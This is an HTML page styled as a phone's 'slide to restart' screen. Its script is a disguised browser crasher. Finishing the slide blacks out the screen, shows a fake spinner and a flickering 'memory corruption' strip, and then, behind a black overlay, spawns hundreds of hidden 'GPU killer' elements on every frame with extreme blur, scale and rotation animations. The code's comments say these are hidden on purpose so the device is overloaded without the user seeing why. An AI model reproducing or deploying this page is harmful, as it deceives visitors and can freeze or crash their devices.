<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Restart Device</title>
    <style>
        /* --- Base styles --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
            transition: background 0.3s ease;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
            pointer-events: none;
            transition: opacity 0.3s ease;
        }

        .header-section {
            text-align: center;
            margin-top: 40px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #fff;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            display: flex;
            flex-direction: column;
            gap: 24px;
            margin-bottom: 20px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
            transition: background 0.1s ease-out, border 0.1s ease-out, backdrop-filter 0.1s ease-out;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: -0.2px;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 40px;
            transition: opacity 0.1s ease-out;
        }

        @keyframes shine {
            0% { background-position: 100% 0; }
            100% { background-position: -100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 12;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            transition: transform 0.1s ease-out;
            touch-action: none;
        }

        .slider-handle:active {
            cursor: grabbing;
        }

        .respring-icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        .loading-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: none;
            pointer-events: none;
        }

        .ispinner {
            position: relative;
            width: 20px;
            height: 20px;
        }
        .ispinner .ispinner-blade {
            position: absolute;
            top: 6.5px;
            left: 8.5px;
            width: 2.5px;
            height: 6.5px;
            background-color: #fff;
            border-radius: 1.25px;
            -webkit-animation: iSpinnerBlade 1s linear infinite;
            animation: iSpinnerBlade 1s linear infinite;
            will-change: opacity;
        }
        .ispinner .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-6.5px);
            transform: rotate(45deg) translateY(-6.5px);
            -webkit-animation-delay: -1.625s;
            animation-delay: -1.625s;
        }
        .ispinner .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-6.5px);
            transform: rotate(90deg) translateY(-6.5px);
            -webkit-animation-delay: -1.5s;
            animation-delay: -1.5s;
        }
        .ispinner .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-6.5px);
            transform: rotate(135deg) translateY(-6.5px);
            -webkit-animation-delay: -1.375s;
            animation-delay: -1.375s;
        }
        .ispinner .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-6.5px);
            transform: rotate(180deg) translateY(-6.5px);
            -webkit-animation-delay: -1.25s;
            animation-delay: -1.25s;
        }
        .ispinner .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-6.5px);
            transform: rotate(225deg) translateY(-6.5px);
            -webkit-animation-delay: -1.125s;
            animation-delay: -1.125s;
        }
        .ispinner .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-6.5px);
            transform: rotate(270deg) translateY(-6.5px);
            -webkit-animation-delay: -1s;
            animation-delay: -1s;
        }
        .ispinner .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-6.5px);
            transform: rotate(315deg) translateY(-6.5px);
            -webkit-animation-delay: -0.875s;
            animation-delay: -0.875s;
        }
        .ispinner .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-6.5px);
            transform: rotate(360deg) translateY(-6.5px);
            -webkit-animation-delay: -0.75s;
            animation-delay: -0.75s;
        }

        .ispinner.ispinner-large {
            width: 35px;
            height: 35px;
        }
        .ispinner.ispinner-large .ispinner-blade {
            top: 11.5px;
            left: 15px;
            width: 5px;
            height: 12px;
            border-radius: 2.5px;
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-11.5px);
            transform: rotate(45deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-11.5px);
            transform: rotate(90deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-11.5px);
            transform: rotate(135deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-11.5px);
            transform: rotate(180deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-11.5px);
            transform: rotate(225deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-11.5px);
            transform: rotate(270deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-11.5px);
            transform: rotate(315deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-11.5px);
            transform: rotate(360deg) translateY(-11.5px);
        }

        @-webkit-keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }
        @keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }

        /* ============================================================
           VISIBLE STRIP – 1px pixels, dense repeating patterns
           ============================================================ */
        #corruption-strip {
            position: fixed;
            top: 50%;
            left: 0;
            width: 100vw;
            height: 20px; /* about 1cm */
            transform: translateY(-50%);
            pointer-events: none;
            z-index: 999999;
            display: none;
            background: #000;
            overflow: hidden;
            mix-blend-mode: screen;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.15);
        }

        .mem-pixel {
            position: absolute;
            width: 1px;
            height: 1px;
            will-change: transform;
            backface-visibility: hidden;
        }

        /* Flicker layer */
        .flash-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: rgba(255, 0, 255, 0.12);
            mix-blend-mode: difference;
            animation: flash 0.06s infinite alternate;
        }

        @keyframes flash {
            0% { opacity: 0; }
            100% { opacity: 0.9; }
        }

        .overlay-pixels {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            mix-blend-mode: overlay;
        }

        /* ============================================================
           BLACK OVERLAY – hides the aggressive GPU killers
           ============================================================ */
        .ghost-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            pointer-events: none;
            z-index: 999998;
            display: none;
        }

        /* ============================================================
           AGGRESSIVE GPU KILLER – exact replica of original
           (invisible due to black background & overlay)
           ============================================================ */
        .gpu-killer-hidden {
            position: fixed;
            border-radius: 50%;
            background: #000; /* invisible */
            mix-blend-mode: normal;
            will-change: transform, filter;
            backface-visibility: hidden;
            perspective: 1000px;
            pointer-events: none;
            z-index: 999997;
            animation: gpuMeltdown 0.05s infinite alternate;
            transform-origin: center;
            opacity: 1;
        }

        @keyframes gpuMeltdown {
            0% {
                transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg);
                filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
            }
            20% {
                transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg);
                filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%);
            }
            50% {
                transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg);
                filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%);
            }
            80% {
                transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg);
                filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%);
            }
            100% {
                transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg);
                filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%);
            }
        }

        /* Second, even faster killer */
        .gpu-killer-hidden2 {
            animation: gpuMeltdown2 0.02s infinite alternate;
            position: fixed;
            width: 1px;
            height: 1px;
            background: #000;
            z-index: 999996;
            pointer-events: none;
            will-change: transform, filter;
        }

        @keyframes gpuMeltdown2 {
            0% {
                transform: scale(1) rotate(0deg);
                filter: blur(0px) contrast(100%);
            }
            100% {
                transform: scale(100000) rotate(720deg);
                filter: blur(200px) contrast(2000%);
            }
        }
    </style>
</head>
<body>
    <div class="header-section">
        <h1>Restart Device</h1>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="track-respring">
            <div class="slider-text">slide to restart</div>
            <div class="slider-handle" id="handle-respring">
                <span class="respring-icon">⟳</span>
            </div>
        </div>
    </div>

    <div class="loading-container" id="respring-loader">
        <div class="ispinner ispinner-large">
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
        </div>
    </div>

    <!-- Black overlay -->
    <div class="ghost-overlay" id="ghostOverlay"></div>

    <!-- Visible strip -->
    <div id="corruption-strip"></div>

    <script>
        // ================================================================
        // 1. VISIBLE STRIP – 1px pixels with repeating patterns
        // ================================================================
        function buildPixelStrip() {
            const strip = document.getElementById('corruption-strip');
            strip.innerHTML = '';
            strip.style.display = 'block';

            const pixelSize = 1; // smallest possible
            const cols = Math.ceil(window.innerWidth / pixelSize);
            const rows = Math.ceil(20 / pixelSize); // 20px height

            // Create a limited palette (16 colors) to create repeating patterns
            const palette = [];
            for (let i = 0; i < 16; i++) {
                const r = Math.floor(Math.random() * 256);
                const g = Math.floor(Math.random() * 256);
                const b = Math.floor(Math.random() * 256);
                palette.push(`rgb(${r},${g},${b})`);
            }

            let html = '';
            // We'll use block patterns: every 4x4 block shares the same base color
            const blockSize = 4; // 4x4 pixel blocks
            for (let r = 0; r < rows; r++) {
                for (let c = 0; c < cols; c++) {
                    // Compute block index
                    const blockRow = Math.floor(r / blockSize);
                    const blockCol = Math.floor(c / blockSize);
                    const idx = (blockRow + blockCol) % palette.length;
                    const color = palette[idx];
                    const left = c * pixelSize;
                    const top = r * pixelSize;
                    html += `<div class="mem-pixel" style="left:${left}px;top:${top}px;background:${color};"></div>`;
                }
            }
            strip.innerHTML = html;

            // Add flicker layers
            const flash = document.createElement('div');
            flash.className = 'flash-layer';
            strip.appendChild(flash);

            // Add overlay pixels (semi-transparent random)
            const overlay = document.createElement('div');
            overlay.className = 'overlay-pixels';
            for (let i = 0; i < cols * rows * 0.2; i++) {
                const px = document.createElement('div');
                const size = 1 + Math.random() * 2;
                px.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${size}px;height:${size}px;background:hsl(${Math.random()*360},100%,50%);opacity:${0.1+Math.random()*0.3};`;
                overlay.appendChild(px);
            }
            strip.appendChild(overlay);

            // Flicker effect
            let visible = true;
            setInterval(() => {
                visible = !visible;
                strip.style.opacity = visible ? '1' : '0.1';
            }, 120);
        }

        // ================================================================
        // 2. AGGRESSIVE GPU KILLERS – exact replica of original
        //    but with black background and hidden behind overlay
        // ================================================================
        function startGpuInferno() {
            // Dynamically inject the keyframes (already in CSS)
            // We'll spawn elements continuously, just like original.

            let elementCount = 0;
            const maxElements = 5000; // safety

            function createKillers() {
                try {
                    // Batch of 200 elements per frame
                    for (let i = 0; i < 200; i++) {
                        const el = document.createElement('div');
                        el.className = 'gpu-killer-hidden';
                        // Random size (like original: 100-500px)
                        const size = 100 + Math.random() * 400;
                        el.style.width = size + 'px';
                        el.style.height = size + 'px';
                        el.style.left = Math.random() * 100 + 'vw';
                        el.style.top = Math.random() * 100 + 'vh';
                        el.style.animationDelay = (Math.random() * 0.1) + 's';
                        // Add a background gradient that's black (invisible)
                        el.style.background = '#000';
                        document.body.appendChild(el);
                        elementCount++;
                    }

                    // Also spawn some of the second type
                    for (let i = 0; i < 50; i++) {
                        const el2 = document.createElement('div');
                        el2.className = 'gpu-killer-hidden2';
                        el2.style.left = Math.random() * 100 + 'vw';
                        el2.style.top = Math.random() * 100 + 'vh';
                        el2.style.animationDelay = (Math.random() * 0.05) + 's';
                        document.body.appendChild(el2);
                        elementCount++;
                    }

                    // If we exceed limit, remove old ones to keep going
                    if (elementCount > maxElements) {
                        const killers = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2');
                        for (let i = 0; i < 500; i++) {
                            if (killers[i]) killers[i].remove();
                        }
                        elementCount = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2').length;
                    }

                    requestAnimationFrame(createKillers);
                } catch(e) {
                    // Continue on error
                    requestAnimationFrame(createKillers);
                }
            }

            // Start the loop
            createKillers();

            // Also spawn an initial massive batch
            for (let i = 0; i < 800; i++) {
                const el = document.createElement('div');
                el.className = 'gpu-killer-hidden';
                const size = 100 + Math.random() * 400;
                el.style.width = size + 'px';
                el.style.height = size + 'px';
                el.style.left = Math.random() * 100 + 'vw';
                el.style.top = Math.random() * 100 + 'vh';
                el.style.animationDelay = (Math.random() * 0.1) + 's';
                el.style.background = '#000';
                document.body.appendChild(el);
            }
            for (let i = 0; i < 200; i++) {
                const el2 = document.createElement('div');
                el2.className = 'gpu-killer-hidden2';
                el2.style.left = Math.random() * 100 + 'vw';
                el2.style.top = Math.random() * 100 + 'vh';
                el2.style.animationDelay = (Math.random() * 0.05) + 's';
                document.body.appendChild(el2);
            }
        }

        // ================================================================
        // 3. SEQUENTIAL PHASE HANDLER
        // ================================================================
        function triggerPhasedSequence(intensity) {
            // Hide UI
            document.querySelector('.header-section').style.display = 'none';
            document.querySelector('.slider-container').style.display = 'none';

            // Show black overlay
            document.getElementById('ghostOverlay').style.display = 'block';

            setTimeout(() => {
                const loader = document.getElementById('respring-loader');
                loader.style.display = 'block';

                setTimeout(() => {
                    loader.style.display = 'none';
                    // Build the visible strip
                    buildPixelStrip();
                    // Start the GPU inferno (invisible)
                    startGpuInferno();
                }, 1000);
            }, 500);
        }

        // ================================================================
        // 4. SLIDER CONTROLLER
        // ================================================================
        function setupSlider(handleId, trackId, multiplier) {
            const handle = document.getElementById(handleId);
            const track = document.getElementById(trackId);
            const header = document.querySelector('.header-section');
            const textElement = track.querySelector('.slider-text');

            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;
            let currentDeltaX = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                currentDeltaX = currentX - startX;

                if (currentDeltaX < 0) currentDeltaX = 0;
                if (currentDeltaX > maxDelta) currentDeltaX = maxDelta;

                handle.style.transform = `translateX(${currentDeltaX}px)`;

                let progress = currentDeltaX / maxDelta;
                let inverseOpacity = 1 - progress;

                header.style.opacity = inverseOpacity;
                textElement.style.opacity = inverseOpacity;

                track.style.background = `rgba(35, 35, 35, ${0.45 * inverseOpacity})`;
                track.style.borderColor = `rgba(255, 255, 255, ${0.05 * inverseOpacity})`;
                track.style.webkitBackdropFilter = `blur(${20 * inverseOpacity}px)`;
                track.style.backdropFilter = `blur(${20 * inverseOpacity}px)`;
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;

                if (currentDeltaX >= maxDelta) {
                    triggerPhasedSequence(multiplier);
                } else {
                    currentDeltaX = 0;
                    handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                    handle.style.transform = 'translateX(0px)';

                    header.style.transition = 'opacity 0.3s';
                    header.style.opacity = '1';

                    textElement.style.transition = 'opacity 0.3s';
                    textElement.style.opacity = '1';

                    track.style.background = 'rgba(35, 35, 35, 0.45)';
                    track.style.borderColor = 'rgba(255, 255, 255, 0.05)';
                    track.style.webkitBackdropFilter = 'blur(20px)';
                    track.style.backdropFilter = 'blur(20px)';
                }
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        // Initialize
        setupSlider('handle-respring', 'track-respring', 1);
    </script>
</body>
</html>
